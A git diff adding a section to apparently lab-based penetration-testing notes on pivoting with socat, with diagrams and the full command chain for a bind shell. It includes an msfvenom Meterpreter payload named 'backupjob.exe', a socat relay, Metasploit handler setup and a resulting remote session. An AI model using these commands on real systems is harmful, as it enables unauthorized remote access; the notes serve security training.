@@ -1292,9 +1292,44 @@ Once accepted, you will gain full RDP access to the internal host.
 <summary><h1>🏓 Playing Pong with Socat</h1></summary>
 
 <details>
-<summary><h1>Socat redirection with a Reverse Shell</h1></summary>
+<summary><h2>Socat redirection with a Reverse Shell</h2></summary>
 
 Socat is a bidirectional relay tool that creates pipe sockets between two independent network channels without using SSH tunneling. It functions as a redirector that listens on one host and port and forwards data to another IP address and port.
+
+```mermaid
+flowchart LR
+    %% Nodes
+    A["<b>🔴 Attack Host</b><br/>10.10.14.18"]
+    MH["<b>Metasploit Handler</b><br/>Listen: 80"]
+    S["<b>Socat Redirector</b><br/>Listen: 8080<br/>Forward 10.10.14.18:80"]
+    U["<b>🖥️ Ubuntu Server</b><br/>10.129.202.64<br/>172.16.5.129"]
+    V["<b>🖥️ Windows Victim</b><br/>172.16.5.19<br/>User: INLANEFREIGHT\victor"]
+    P["<b>📦 Payload</b><br/>backupscript.exe<br/>LHOST=172.16.5.129:8080"]
+    
+    %% Connections
+    MH ---|"<b>Running on</b>"| A
+    S ---|"<b>Running on</b>"| U
+    P ---|"<b>Executed on</b>"| V
+    V -.->|"<b>1.</b> Reverse Connection"| S
+    S -.->|"<b>2.</b> Forwards to"| MH
+    MH ==>|"<b>3.</b> Meterpreter Session<br/>Established"| A
+    
+    %% Styling
+    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
+    style MH fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
+    style S fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style V fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style P fill:#8b6a3a,stroke:#ff9500,stroke-width:3px,color:#fff
+    
+    %% Link styling
+    linkStyle 0 stroke:#9b87f5,stroke-width:2px
+    linkStyle 1 stroke:#6c8ebf,stroke-width:2px
+    linkStyle 2 stroke:#ff9500,stroke-width:2px
+    linkStyle 3 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
+    linkStyle 4 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
+    linkStyle 5 stroke:#ff6b6b,stroke-width:4px
+```
 
 Metasploit's listener can be started on the attack host using the following command.
 
@@ -1367,7 +1402,98 @@ meterpreter > getuid
 </details>
 
 <details>
-<summary><h1>Socat redirection with a Blind Shell</h1></summary>
+<summary><h2>Socat redirection with a Bind Shell</h2></summary>
+
+A socat bind shell redirector can be created similarly to a reverse shell redirector. This differs from reverse shells, which connect from the Windows server to the Ubuntu server and get redirected to the attack host. For bind shells, the Windows server starts a listener and binds to a specific port. A socat redirector can be created on the Ubuntu server to listen for incoming connections from a Metasploit bind handler and forward them to the bind shell payload on the Windows target.
+
+```mermaid
+flowchart LR
+    %% Nodes
+    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
+    M["<b>Metasploit Handler</b>"]
+    S["<b>Socat</b><br/>Listen: 8080<br/>Forward 172.16.5.19:8443"]
+    V1["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
+    BS["<b>📁 Bind Shell</b><br/>Listen: 8443"]
+    V2["<b>🖥️ Victim Server (Windows A)</b><br/>172.16.5.19<br/>RDP Service"]
+    
+    %% Connections
+    A -->|"<b>Stage Request</b>"| M
+    M -.->|"<b>Stage Request</b>"| S
+    S -.->|"<b>Forward</b>"| V1
+    V1 -.->|"<b>Response</b>"| BS
+    BS -.->|"<b>Response</b>"| V2
+    
+    %% Styling
+    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
+    style M fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
+    style S fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
+    style V1 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    style BS fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
+    style V2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
+    
+    %% Link styling
+    linkStyle 0 stroke:#ff6b6b,stroke-width:3px
+    linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+    linkStyle 2 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
+    linkStyle 3 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
+    linkStyle 4 stroke:#9b87f5,stroke-width:3px,stroke-dasharray:5
+```
+
+**Creating the Windows Payload**
+
+```bash
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+```
+```bash
+# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+# [-] No arch selected, selecting arch: x64 from the payload
+# No encoder specified, outputting raw payload
+# Payload size: 499 bytes
+# Final size of exe file: 7168 bytes
+# Saved as: backupjob.exe
+```
+
+We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
+
+**Starting Socat Bind Shell Listener in the Ubuntu Server**
+
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+```
+
+Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
+
+**Configuring & Starting the Bind multi/handler**
+
+```bash
+sudo msfconsole
+```
+```bash
+use exploit/multi/handler
+
+# [*] Using configured payload generic/shell_reverse_tcp
+set payload windows/x64/meterpreter/bind_tcp
+# payload => windows/x64/meterpreter/bind_tcp
+set RHOST 10.129.202.64
+# RHOST => 10.129.202.64
+set LPORT 8080
+# LPORT => 8080
+run
+
+# [*] Started bind TCP handler against 10.129.202.64:8080
+```
+
+We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
+
+**Establishing Meterpreter Session**
+
+```bash
+# [*] Sending stage (200262 bytes) to 10.129.202.64
+# [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
+
+meterpreter > getuid
+# Server username: INLANEFREIGHT\victor
+```
 
 </details>
 
